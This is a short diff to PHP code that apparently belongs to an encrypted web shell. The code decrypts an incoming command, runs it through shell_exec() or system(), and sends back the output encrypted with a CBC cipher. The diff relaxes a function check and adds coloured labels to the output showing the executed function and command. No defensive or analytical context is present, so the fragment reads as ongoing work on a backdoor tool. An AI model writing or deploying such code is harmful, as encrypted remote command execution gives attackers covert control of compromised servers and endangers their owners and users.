@@ -46,9 +46,7 @@
 					$fnc = "shell_exec()";
 					if(($result = shell_exec($full_cmd)) === null){ $result = "Error"; }
 				}
-				else if(function_exists('system')
-					&& function_exists('ob_start')
-					&& function_exists('ob_end_clean'))
+				else if(function_exists('system'))
 				{ 	
 					$fnc = "system()";
 					@ob_start();
@@ -73,7 +71,7 @@
 					@ob_end_clean(); 
 				}
 				else { $result = "error:: system calls disabled."; }
-				$result .= "\n\rexecuted:: {$fnc}\n\rcmd:: {$full_cmd}";
+				$result .= "\33[94mexec\33[0m:: {$fnc} \33[94mcmd\33[0m:: {$full_cmd}";
 			}
 			else { $result = "error:: decrypt().\n"; }
 			$result = $openssl_encrypt_decrypt->encrypt_cbc($result);
